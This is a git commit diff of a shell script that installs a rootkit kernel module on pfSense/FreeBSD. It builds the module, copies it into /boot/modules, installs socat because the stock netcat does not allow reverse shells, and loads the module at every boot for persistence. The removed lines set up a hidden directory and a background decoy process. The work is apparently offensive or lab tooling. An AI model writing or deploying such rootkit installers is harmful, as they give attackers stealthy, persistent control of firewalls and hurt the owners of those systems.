3e01c5c888103192aba1a13f999fd1a01c79dae8
Baremetal MSI <spark61974@gmail.com>
2025-02-18 00:01:41 -0500

    .

--- load_and_setup.sh
+++ load_and_setup.sh
@@ -7,26 +7,17 @@ fi
 
 # make writable
 mount -o rw /
-# make maliocus directory
-mkdir /etc/devd/conf_backs
-# define new directory to hide things in and LKM name
-LKM_PROC="/etc/devd/conf_backs"
-LKM_NAME="LD_PRELOAD.ko"
+
+make
+
+mv LD_PRELOAD.ko LD_PRELOAD
+LKM_NAME="LD_PRELOAD"
 
 # put the rootkit in the modules
 cp "$LKM_NAME" /boot/modules/
 # the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
 # therefore we get socat
 pkg install socat -y
-
-# executable
-chmod +x apeshit
-# put the process in the hidden directory
-cp "apeshit" "$PROC_PATH/"
-
-# run the daemon/process that does nothing that we intend to fork
-cd "$PROC_PATH"
-./apeshit &
 
 # achieve persistance by loading the module everytime the system boots
 # Ensure kld_list includes the LKM
